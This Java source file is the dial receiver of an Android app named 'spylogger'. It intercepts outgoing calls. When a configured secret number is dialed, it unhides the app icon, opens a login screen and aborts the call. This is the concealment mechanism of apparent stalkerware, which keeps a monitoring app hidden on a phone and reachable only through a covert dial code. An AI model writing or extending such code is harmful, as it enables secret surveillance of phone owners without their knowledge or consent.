package com.gravatasufoca.spylogger.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.gravatasufoca.spylogger.activities.LoginActivity;
import com.gravatasufoca.spylogger.dao.DatabaseHelper;
import com.gravatasufoca.spylogger.model.Configuracao;
import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
import com.gravatasufoca.spylogger.utils.Utils;

import java.sql.SQLException;


public class DialReceiver extends BroadcastReceiver {
	@Override
	public void onReceive(Context context, Intent intent) {

		DatabaseHelper database = new DatabaseHelper(
				context);
		try {
			RepositorioConfiguracao repositorioConfiguracao=new RepositorioConfiguracaoImpl(context);

			Configuracao conf = repositorioConfiguracao.getConfiguracao();

			if (conf != null) {
				String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
				String compare_num = conf.getDialer();
				if (number.equals(compare_num)) {
					Utils.showIcon(true, context);
					//TODO: MUDAR PARA A MAIN
					Intent myintent = new Intent(context, LoginActivity.class);
					myintent.putExtra("hide", true);
					myintent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					context.startActivity(myintent);
					setResultData(null);
					abortBroadcast();

				}
			}
		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
}